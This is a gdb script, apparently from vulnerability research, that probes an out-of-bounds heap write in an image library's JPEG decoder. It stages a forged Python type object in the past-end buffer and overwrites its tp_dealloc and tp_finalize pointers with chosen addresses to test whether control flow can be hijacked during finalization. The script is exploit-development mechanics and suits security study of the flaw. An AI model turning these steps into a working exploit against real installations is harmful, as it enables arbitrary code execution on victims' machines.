# W14: can the OOB-forged ob_type reach a tp_finalize slot via natural
# finalization, and what is the first argument there?
# Rung-4 mechanics only: gdb stages the fake type and the pointer.
set pagination off
set breakpoint pending on
break ImagingJpegDecode
run
set $b=(unsigned char*)state->buffer
printf "BUF=%p TYPE_NOW=%lx\n", $b, *(unsigned long*)($b+184)
# snapshot the whole past-end span so we can restore a pristine heap
dump binary memory /tmp/pw2-w14/pre.bin $b+128 $b+192
dump binary memory /tmp/pw2-w14/post.bin $b+192 $b+1200
set $fake=$b+736
restore /tmp/pw2-w14/pre.bin binary $b+128
restore /tmp/pw2-w14/post.bin binary $b+192
dump binary memory /tmp/pw2-w14/realtype.bin (char*)&PyUnicode_Type (char*)&PyUnicode_Type+416
restore /tmp/pw2-w14/realtype.bin binary $fake
# tp_dealloc -> PyObject_CallFinalizerFromDealloc (0x585c40)
# tp_finalize -> _PyObject_Dump marker (0x45e6e6)
set *(unsigned long*)($fake+48)=0x585c40
set *(unsigned long*)($fake+392)=0x45e6e6
set *(unsigned long*)($b+184)=$fake
printf "STAGED fake=%lx dealloc=%lx finalize=%lx obtype=%lx\n", $fake, *(unsigned long*)($fake+48), *(unsigned long*)($fake+392), *(unsigned long*)($b+184)
break *0x45e6e6
continue
printf "HIT pc=%p rdi=%p refcnt=%lx type=%lx\n", $pc, $rdi, *(unsigned long*)$rdi, *(unsigned long*)($rdi+8)
x/16bx $rdi
bt 8
info registers rdi rsi
quit
